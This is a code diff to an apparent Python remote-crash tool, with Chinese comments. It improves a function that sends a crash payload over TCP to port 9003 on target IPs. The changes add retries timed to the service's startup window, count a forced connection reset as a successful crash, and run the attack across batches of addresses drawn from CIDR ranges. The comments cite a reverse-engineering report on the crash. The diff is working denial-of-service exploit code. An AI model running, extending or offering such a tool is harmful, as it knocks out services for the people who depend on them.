@@ -57,14 +57,25 @@ def expand_cidr(cidr: str):
 
 
 def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
-          timeout: float = DEFAULT_TIMEOUT) -> str:
-    """按 IP 对远程主机发送崩溃载荷。
+          timeout: float = DEFAULT_TIMEOUT, retries: int = 2,
+          retry_delay: float = 3.0) -> str:
+    """按 IP 对远程主机发送崩溃载荷（智能判定 + 自动重试）。
+
+    判定规则（依据 docs/CRASH_FUNCTION_REVERSE_REPORT.md 逆向结论）：
+      - ConnectionRefusedError(10061) → 9003 未监听（服务未拉起/空窗期）
+        → 自动等待 retry_delay 秒重试，覆盖“第一次拒连、第二次成功”的拉起窗口
+      - ConnectionResetError(10054)  → 连接建立后被强制关闭
+        → 即服务端解析线程崩溃、socket 被 RST → ★ 崩溃已触发（成功）
+      - socket.timeout               → 载荷已送达，等待响应超时（可能已生效）
+      - 发送成功无异常               → 载荷已送达，等待观察
 
     Args:
-        ip:     目标主机 IP。
-        port:   目标端口。
-        payload:要发送的原始字节载荷。
-        timeout:连接/收发超时。
+        ip:          目标主机 IP。
+        port:        目标端口。
+        payload:     要发送的原始字节载荷。
+        timeout:     连接/收发超时。
+        retries:     10061 未监听时的重试次数（默认 2，即最多尝试 3 次）。
+        retry_delay: 重试间隔秒数，覆盖 9003 服务拉起窗口（默认 3s）。
 
     Returns:
         结果描述字符串。
@@ -79,41 +90,64 @@ def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
         error(f"远程崩溃：端口无效: {port}")
         return f"端口无效: {port}"
 
-    debug(f"远程崩溃 开始 → 目标 {ip}:{port}，载荷 {len(payload)} 字节 [{payload!r}]，超时 {timeout}s")
-    t0 = time.perf_counter()
-    try:
-        sock = socket.create_connection((ip, port), timeout=timeout)
-        conn_ms = (time.perf_counter() - t0) * 1000
-        debug(f"TCP 连接建立成功 {ip}:{port}（耗时 {conn_ms:.0f}ms）")
+    attempts = 1 + max(0, int(retries))
+    for attempt in range(1, attempts + 1):
+        debug(f"远程崩溃 尝试[{attempt}/{attempts}] → 目标 {ip}:{port}，"
+              f"载荷 {len(payload)} 字节 [{payload!r}]，超时 {timeout}s")
+        t0 = time.perf_counter()
+        try:
+            sock = socket.create_connection((ip, port), timeout=timeout)
+            conn_ms = (time.perf_counter() - t0) * 1000
+            debug(f"TCP 连接建立成功 {ip}:{port}（耗时 {conn_ms:.0f}ms）")
+        except ConnectionRefusedError:
+            el = (time.perf_counter() - t0) * 1000
+            if attempt < attempts:
+                warn(f"尝试[{attempt}/{attempts}] {ip}:{port} 未监听(10061，耗时 {el:.0f}ms)，"
+                     f"{retry_delay}s 后重试（9003 服务可能正在拉起）")
+                time.sleep(retry_delay)
+                continue
+            warn(f"{ip}:{port} 重试 {retries} 次后 9003 仍拒连，服务未拉起")
+            return f"连接 {ip}:{port} 被拒(10061) ×{attempts}，9003 未监听（服务未拉起），已放弃"
+        except socket.timeout:
+            el = (time.perf_counter() - t0) * 1000
+            warn(f"连接 {ip}:{port} 超时（{timeout}s）（耗时 {el:.0f}ms）")
+            return f"连接 {ip}:{port} 超时，发送失败"
+        except socket.gaierror as exc:
+            error(f"无法解析主机 {ip}: {exc}")
+            return f"无法解析主机 {ip}"
+        except OSError as exc:
+            el = (time.perf_counter() - t0) * 1000
+            warn(f"连接 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
+            return f"连接 {ip}:{port} 失败: {exc}"
+
+        # 连接成功：发送载荷并判定结果
         try:
             sock.sendall(payload)
             debug(f"已发送载荷 {len(payload)} 字节到 {ip}:{port}")
-            # 尝试读取响应，非必须
             try:
                 resp = sock.recv(64)
-                extra = f"，收到响应 {len(resp)} 字节" if resp else "，无响应"
                 if resp:
-                    debug(f"收到响应 {len(resp)} 字节: {resp!r}")
+                    extra = f"，收到响应 {len(resp)} 字节: {resp!r}"
+                    msg = f"崩溃指令已发送到 {ip}:{port}{extra}"
+                else:
+                    extra = "，连接被对方正常关闭(EOF)"
+                    msg = f"崩溃指令已发送到 {ip}:{port}{extra}"
+                info(msg)
+                return msg
+            except ConnectionResetError:
+                # 10054：连接建立后被强制关闭 = 服务端解析线程崩溃 → 成功
+                msg = f"{ip}:{port} ✅ 载荷已送达，对方连接被强制关闭（崩溃已触发）"
+                info(msg)
+                return msg
             except socket.timeout:
-                extra = "（发送完成，等待响应超时）"
-                debug("等待响应超时（预期内，载荷已送达）")
-            msg = f"远程崩溃指令已发送到 {ip}:{port}{extra}"
-            info(msg)
-            return msg
+                msg = f"{ip}:{port} 载荷已送达，等待响应超时（可能已生效，观察 10s）"
+                info(msg)
+                return msg
         finally:
             sock.close()
             debug(f"已关闭与 {ip}:{port} 的连接")
-    except socket.timeout:
-        el = (time.perf_counter() - t0) * 1000
-        warn(f"连接 {ip}:{port} 超时（{timeout}s），发送失败（耗时 {el:.0f}ms）")
-        return f"连接 {ip}:{port} 超时，发送失败"
-    except socket.gaierror as exc:
-        error(f"无法解析主机 {ip}: {exc}")
-        return f"无法解析主机 {ip}"
-    except OSError as exc:
-        el = (time.perf_counter() - t0) * 1000
-        warn(f"连接 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
-        return f"连接 {ip}:{port} 失败: {exc}"
+
+    return f"连接 {ip}:{port} 失败"  # 理论不可达
 
 
 def crash_targets(ips, port: int = DEFAULT_PORT,
@@ -134,7 +168,11 @@ def crash_targets(ips, port: int = DEFAULT_PORT,
     for i, ip in enumerate(ips, 1):
         debug(f"--- 批量进度 [{i}/{len(ips)}] {ip} ---")
         r = crash(ip, port, payload)
-        if "发送" in r and "失败" not in r:
+        # 成功标志：✅(崩溃已触发) / 已送达 / 已发送 / 发送到，且不含“失败”
+        success = ("失败" not in r) and any(
+            m in r for m in ("✅", "已送达", "已发送", "发送到")
+        )
+        if success:
             ok += 1
         else:
             fail += 1
